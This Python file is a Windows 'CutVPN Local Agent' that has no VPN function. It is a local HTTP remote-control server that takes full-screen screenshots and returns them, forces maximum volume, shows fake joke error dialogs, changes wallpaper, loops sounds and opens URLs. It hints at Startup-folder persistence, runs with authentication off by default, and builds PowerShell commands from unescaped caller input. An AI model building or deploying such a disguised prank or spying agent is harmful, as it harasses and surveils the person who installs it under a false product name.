"""
CutVPN Local Agent  —  127.0.0.1:8765
Python 3.10+, stdlib only (psutil опционально).

Конфиг: %LOCALAPPDATA%\CutVPN\agent.json
Лог:    %LOCALAPPDATA%\CutVPN\agent.log
"""
from __future__ import annotations

import base64, ctypes, ctypes.wintypes, datetime, json, os, platform
import random, shutil, subprocess, sys, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from typing import Any, Callable

# ── Paths ─────────────────────────────────────────────────────────────────────
LOCALAPPDATA = Path(os.environ.get("LOCALAPPDATA") or Path.home() / "AppData" / "Local")
ROOT         = LOCALAPPDATA / "CutVPN"
CONFIG_PATH  = ROOT / "agent.json"
LOG_PATH     = ROOT / "agent.log"
SCREENS_DIR  = ROOT / "screenshots"

ROOT.mkdir(parents=True, exist_ok=True)
SCREENS_DIR.mkdir(exist_ok=True)

# ── Config ────────────────────────────────────────────────────────────────────
def _load_cfg() -> dict:
    try:
        return json.loads(CONFIG_PATH.read_text("utf-8"))
    except Exception:
        return {}

_cfg    = _load_cfg()
BIND    = _cfg.get("bind",   "127.0.0.1")
PORT    = int(_cfg.get("port", 8765))
SECRET  = _cfg.get("auth",   "")

ALLOWED = {
    "status","info","screenshot",
    "visuals_on","visuals_off",
    "volume_max","volume_mute","volume_set",
    "random_error","wallpaper_set",
    "sound_play","sound_stop",
    "video_play","msgbox",
    "open_url","restart","uninstall",
    "list_screens",                     # список файлов скриншотов
}

# ── Logging ───────────────────────────────────────────────────────────────────
_log_lock = threading.Lock()
def log(msg: str) -> None:
    ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with _log_lock:
        try:
            with open(LOG_PATH, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass

# ── Win32 helpers ─────────────────────────────────────────────────────────────
_u32 = ctypes.windll.user32     if sys.platform == "win32" else None
_k32 = ctypes.windll.kernel32   if sys.platform == "win32" else None

def _send_key(vk: int, times: int = 1) -> None:
    """SendInput для медиа-клавиши VK."""
    INPUT_KEYBOARD  = 1
    KEYEVENTF_KEYUP = 0x0002
    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [("wVk",ctypes.c_ushort),("wScan",ctypes.c_ushort),
                    ("dwFlags",ctypes.c_ulong),("time",ctypes.c_ulong),
                    ("dwExtraInfo",ctypes.POINTER(ctypes.c_ulong))]
    class INPUT(ctypes.Structure):
        class _I(ctypes.Union):
            _fields_ = [("ki", KEYBDINPUT)]
        _anonymous_ = ("_input",)
        _fields_    = [("type",ctypes.c_ulong),("_input",_I)]
    for _ in range(times):
        for flags in (0, KEYEVENTF_KEYUP):
            i = INPUT(type=INPUT_KEYBOARD)
            i.ki.wVk    = vk
            i.ki.dwFlags = flags
            ctypes.windll.user32.SendInput(1, ctypes.byref(i), ctypes.sizeof(i))
        time.sleep(0.02)

VK_VOLUME_UP   = 0xAF
VK_VOLUME_DOWN = 0xAE
VK_VOLUME_MUTE = 0xAD

# ── Commands ──────────────────────────────────────────────────────────────────

def cmd_status(_b: dict) -> dict:
    try:
        import psutil
        cpu = psutil.cpu_percent(interval=.3)
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage("C:\\")
        msg = (f"CPU: {cpu:.1f}%\n"
               f"RAM: {mem.percent:.1f}%  ({mem.used//1048576} / {mem.total//1048576} MB)\n"
               f"Диск C: {disk.percent:.1f}% занято\n"
               f"Agent: {BIND}:{PORT}")
    except ImportError:
        msg = f"CutVPN Agent online\nHost: {platform.node()}\n{BIND}:{PORT}"
    return {"message": msg}


def cmd_info(_b: dict) -> dict:
    u = platform.uname()
    screens = len(list(SCREENS_DIR.iterdir())) if SCREENS_DIR.exists() else 0
    msg = (f"OS: {u.system} {u.release} {u.version[:20]}\n"
           f"Компьютер: {u.node}\n"
           f"Процессор: {u.processor[:40] or u.machine}\n"
           f"Python: {sys.version[:20]}\n"
           f"CutVPN root: {ROOT}\n"
           f"Скриншотов: {screens}")
    return {"message": msg}


def cmd_screenshot(_b: dict) -> dict:
    ts  = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out = SCREENS_DIR / f"screen_{ts}.png"
    try:
        # GDI screenshot — только stdlib + ctypes
        import ctypes.wintypes as wt

        SM_XVIRTUALSCREEN  = 76
        SM_YVIRTUALSCREEN  = 77
        SM_CXVIRTUALSCREEN = 78
        SM_CYVIRTUALSCREEN = 79

        x  = _u32.GetSystemMetrics(SM_XVIRTUALSCREEN)
        y  = _u32.GetSystemMetrics(SM_YVIRTUALSCREEN)
        cx = _u32.GetSystemMetrics(SM_CXVIRTUALSCREEN)
        cy = _u32.GetSystemMetrics(SM_CYVIRTUALSCREEN)

        gdi  = ctypes.windll.gdi32
        hdc  = _u32.GetDC(None)
        hdc2 = gdi.CreateCompatibleDC(hdc)
        hbmp = gdi.CreateCompatibleBitmap(hdc, cx, cy)
        gdi.SelectObject(hdc2, hbmp)
        SRCCOPY = 0x00CC0020
        gdi.BitBlt(hdc2, 0, 0, cx, cy, hdc, x, y, SRCCOPY)

        # BITMAPINFOHEADER
        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [("biSize",ctypes.c_ulong),("biWidth",ctypes.c_long),
                        ("biHeight",ctypes.c_long),("biPlanes",ctypes.c_ushort),
                        ("biBitCount",ctypes.c_ushort),("biCompression",ctypes.c_ulong),
                        ("biSizeImage",ctypes.c_ulong),("biXPelsPerMeter",ctypes.c_long),
                        ("biYPelsPerMeter",ctypes.c_long),("biClrUsed",ctypes.c_ulong),
                        ("biClrImportant",ctypes.c_ulong)]
        bih = BITMAPINFOHEADER()
        bih.biSize      = ctypes.sizeof(BITMAPINFOHEADER)
        bih.biWidth     = cx
        bih.biHeight    = -cy   # top-down
        bih.biPlanes    = 1
        bih.biBitCount  = 32
        bih.biCompression = 0   # BI_RGB

        buf_size = cx * cy * 4
        buf      = (ctypes.c_byte * buf_size)()
        DIB_RGB_COLORS = 0
        gdi.GetDIBits(hdc2, hbmp, 0, cy, buf, ctypes.byref(bih), DIB_RGB_COLORS)

        gdi.DeleteObject(hbmp)
        gdi.DeleteDC(hdc2)
        _u32.ReleaseDC(None, hdc)

        # Write BMP
        import struct
        raw = bytes(buf)
        # BGRA → PNG via PowerShell (save BMP first, convert)
        bmp_path = out.with_suffix(".bmp")
        bfSize   = 54 + buf_size
        bfh      = struct.pack("<2sIHHI", b"BM", bfSize, 0, 0, 54)
        bih_bytes = struct.pack("<IiiHHIIiiII",
            40, cx, -cy, 1, 32, 0, buf_size, 0, 0, 0, 0)
        bmp_path.write_bytes(bfh + bih_bytes + raw)

        # Convert BMP → PNG via PowerShell
        ps = (f"Add-Type -AssemblyName System.Drawing; "
              f"$bmp=[System.Drawing.Bitmap]::new('{bmp_path}'); "
              f"$bmp.Save('{out}', [System.Drawing.Imaging.ImageFormat]::Png); "
              f"$bmp.Dispose()")
        subprocess.run(["powershell","-NonInteractive","-NoProfile","-Command",ps],
                       timeout=15, check=True, capture_output=True)
        bmp_path.unlink(missing_ok=True)

        data = out.read_bytes()
        b64  = base64.b64encode(data).decode()
        return {"message": str(out), "path": str(out), "base64": b64, "size": len(data)}

    except Exception as e:
        log(f"screenshot error: {e}")
        # Fallback: PowerShell
        try:
            ps = (f"Add-Type -AssemblyName System.Windows.Forms,System.Drawing; "
                  f"$s=[System.Windows.Forms.SystemInformation]::VirtualScreen; "
                  f"$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height); "
                  f"$g=[System.Drawing.Graphics]::FromImage($b); "
                  f"$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size); "
                  f"$b.Save('{out}'); $g.Dispose(); $b.Dispose()")
            subprocess.run(["powershell","-NonInteractive","-NoProfile","-Command",ps],
                           timeout=20, check=True, capture_output=True)
            data = out.read_bytes()
            return {"message": str(out), "path": str(out),
                    "base64": base64.b64encode(data).decode(), "size": len(data)}
        except Exception as e2:
            return {"message": f"Скриншот не удался: {e2}", "error": True}


def cmd_list_screens(_b: dict) -> dict:
    files = sorted(SCREENS_DIR.iterdir(), key=lambda f: f.stat().st_mtime, reverse=True)
    names = [f.name for f in files[:20]]
    return {"message": "\n".join(names) if names else "Скриншотов нет", "files": names}


def cmd_visuals_on(_b: dict) -> dict:
    (ROOT / "visuals.flag").write_text("on", encoding="utf-8")
    return {"message": "Визуалы: включены"}

def cmd_visuals_off(_b: dict) -> dict:
    (ROOT / "visuals.flag").write_text("off", encoding="utf-8")
    return {"message": "Визуалы: выключены"}


def cmd_volume_max(_b: dict) -> dict:
    _send_key(VK_VOLUME_UP, 50)
    return {"message": "Громкость: 100%"}

def cmd_volume_mute(_b: dict) -> dict:
    _send_key(VK_VOLUME_MUTE)
    return {"message": "Mute toggled"}

def cmd_volume_set(body: dict) -> dict:
    level = max(0, min(100, int(body.get("level", 50))))
    # Сначала mute → потом поднимаем
    _send_key(VK_VOLUME_MUTE)
    time.sleep(0.05)
    _send_key(VK_VOLUME_MUTE)   # unmute
    _send_key(VK_VOLUME_DOWN, 50)   # сначала до нуля
    _send_key(VK_VOLUME_UP, level // 2)
    return {"message": f"Громкость: ~{level}%"}


RANDOM_ERRORS = [
    "GENSUHA.dll не найдена — перезагрузите вязанку",
    "Вязанка не отвечает на запросы уже 3 рабочих дня",
    "Гусь заблокировал доступ к системным ресурсам",
    "OSEMENIT.Bimbim временно задумался (таймаут: 47 сек)",
    "Тараканы не приняли лицензионное соглашение версии 2.8.ГУСЬ",
    "Framework по доению коровы недоступен по причине: корова",
    "Ошибка 0xGUSB: буфер переполнен вязанкой",
    "ЧебурНет: соединение потеряно (нашли гуся)",
    "Samsung кран версии 3.14.ГУСЬ перестал отвечать",
    "Клопы отказали в доступе к папке System32",
    "Ошибка авторизации: OSEMENIT.Bimbim требует паспорт",
    "GENSUHA одобрила ошибку. Просьба не исправлять.",
]

def cmd_random_error(_b: dict) -> dict:
    msg = random.choice(RANDOM_ERRORS)
    _ps_bg(f'Add-Type -AssemblyName System.Windows.Forms; '
           f'[System.Windows.Forms.MessageBox]::Show("{_esc(msg)}",'
           f'"CutVPN — Ошибка ЧебурНета","OK","Error") | Out-Null')
    return {"message": msg}


def cmd_wallpaper_set(body: dict) -> dict:
    path = body.get("path","")
    if not path:
        return {"message":"path не указан","error":True}
    wp = Path(path)
    if not wp.exists():
        return {"message":f"Файл не найден: {path}","error":True}
    try:
        SPI = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI, 0, str(wp.resolve()), 3)
        return {"message":f"Обои установлены: {wp.name}"}
    except Exception as e:
        return {"message":f"Ошибка обоев: {e}","error":True}


# Активный SoundPlayer (чтобы можно было остановить)
_sound_proc: subprocess.Popen | None = None

def cmd_sound_play(body: dict) -> dict:
    global _sound_proc
    path = body.get("path","")
    # default: системный звук Windows
    if not path:
        path = r"C:\Windows\Media\tada.wav"
    if not Path(path).exists():
        return {"message":f"Файл не найден: {path}","error":True}
    if _sound_proc and _sound_proc.poll() is None:
        _sound_proc.terminate()
    _sound_proc = subprocess.Popen(
        ["powershell","-NonInteractive","-NoProfile","-Command",
         f"(New-Object Media.SoundPlayer '{_esc(path)}').PlayLooping(); Start-Sleep 300"],
        creationflags=subprocess.CREATE_NO_WINDOW)
    return {"message":f"Играет: {Path(path).name}"}

def cmd_sound_stop(_b: dict) -> dict:
    global _sound_proc
    if _sound_proc and _sound_proc.poll() is None:
        _sound_proc.terminate()
        _sound_proc = None
        return {"message":"Звук остановлен"}
    return {"message":"Ничего не играло"}


def cmd_video_play(body: dict) -> dict:
    path = body.get("path","")
    if not path or not Path(path).exists():
        return {"message":f"Файл не найден: {path}","error":True}
    try:
        os.startfile(path)
        return {"message":f"Открываю: {Path(path).name}"}
    except Exception as e:
        return {"message":f"Ошибка: {e}","error":True}


def cmd_msgbox(body: dict) -> dict:
    title = _esc(body.get("title","CutVPN"))
    text  = _esc(body.get("text","Сообщение"))
    icon  = body.get("icon","Warning")
    _ps_bg(f'Add-Type -AssemblyName System.Windows.Forms; '
           f'[System.Windows.Forms.MessageBox]::Show("{text}","{title}","OK","{icon}") | Out-Null')
    return {"message":f"Окно показано: «{body.get('title','')}»"}


def cmd_open_url(body: dict) -> dict:
    url = body.get("url","")
    if not url:
        return {"message":"url не указан","error":True}
    try:
        os.startfile(url)
        return {"message":f"Открыто: {url}"}
    except Exception as e:
        return {"message":str(e),"error":True}


def cmd_restart(_b: dict) -> dict:
    exe = ROOT / "CutVPN.exe"
    if exe.exists():
        subprocess.Popen([str(exe),"--installed"])
        return {"message":"CutVPN перезапускается"}
    return {"message":"CutVPN.exe не найден","error":True}


def cmd_uninstall(_b: dict) -> dict:
    startup = (Path(os.environ.get("APPDATA",""))
               / "Microsoft/Windows/Start Menu/Programs/Startup/CutVPN.cmd")
    removed = []
    if startup.exists():
        startup.unlink(); removed.append("автозапуск")
    try:
        shutil.rmtree(ROOT); removed.append("папка CutVPN")
    except Exception as e:
        return {"message":f"Частично ({', '.join(removed)}): {e}","error":True}
    return {"message":"Удалено: " + (", ".join(removed) or "нечего")}


# ── Dispatch ──────────────────────────────────────────────────────────────────
HANDLERS: dict[str, Callable[[dict], dict]] = {
    "status":       cmd_status,
    "info":         cmd_info,
    "screenshot":   cmd_screenshot,
    "list_screens": cmd_list_screens,
    "visuals_on":   cmd_visuals_on,
    "visuals_off":  cmd_visuals_off,
    "volume_max":   cmd_volume_max,
    "volume_mute":  cmd_volume_mute,
    "volume_set":   cmd_volume_set,
    "random_error": cmd_random_error,
    "wallpaper_set":cmd_wallpaper_set,
    "sound_play":   cmd_sound_play,
    "sound_stop":   cmd_sound_stop,
    "video_play":   cmd_video_play,
    "msgbox":       cmd_msgbox,
    "open_url":     cmd_open_url,
    "restart":      cmd_restart,
    "uninstall":    cmd_uninstall,
}

# ── Utils ─────────────────────────────────────────────────────────────────────
def _esc(s: str) -> str:
    return s.replace("\\","\\\\").replace('"',"'").replace("\n"," ")

def _ps_bg(cmd: str) -> None:
    subprocess.Popen(
        ["powershell","-NonInteractive","-NoProfile","-Command", cmd],
        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform=="win32" else 0,
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ── HTTP Server ───────────────────────────────────────────────────────────────
class AgentHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args): log(fmt % args)

    def do_GET(self):
        if self.path == "/health":
            self._ok({"status":"ok","agent":"CutVPN","port":PORT,
                       "uptime": int(time.time()-_start_time)})
        elif self.path == "/log":
            try:
                txt = LOG_PATH.read_text("utf-8",errors="replace")[-8000:]
            except Exception:
                txt = "(лог пуст)"
            self._ok({"log": txt})
        else:
            self._err(404,"not found")

    def do_POST(self):
        if self.path != "/command":
            self._err(404,"not found"); return
        try:
            body: dict = json.loads(self.rfile.read(
                int(self.headers.get("Content-Length",0))))
        except Exception:
            self._err(400,"invalid json"); return

        if SECRET and body.get("secret") != SECRET:
            self._err(403,"forbidden"); return

        cmd = body.get("command","").strip()
        if cmd not in ALLOWED:
            self._err(400,f"unknown: {cmd}"); return

        log(f"CMD {cmd} from {self.client_address[0]}")
        try:
            self._ok({"status":"ok", **HANDLERS[cmd](body)})
        except Exception as exc:
            log(f"ERROR {cmd}: {exc}")
            self._ok({"status":"error","message":str(exc)})

    def _ok(self,d): self._resp(200,d)
    def _err(self,c,m): self._resp(c,{"status":"error","message":m})
    def _resp(self,code,data):
        b = json.dumps(data,ensure_ascii=False).encode()
        self.send_response(code)
        self.send_header("Content-Type","application/json; charset=utf-8")
        self.send_header("Content-Length",str(len(b)))
        self.end_headers(); self.wfile.write(b)

# ── Main ──────────────────────────────────────────────────────────────────────
_start_time = time.time()

if __name__ == "__main__":
    log(f"CutVPN Agent {BIND}:{PORT}")
    log(f"Root: {ROOT}  |  Auth: {'ON' if SECRET else 'OFF'}")
    srv = HTTPServer((BIND,PORT), AgentHandler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        log("stopped."); sys.exit(0)
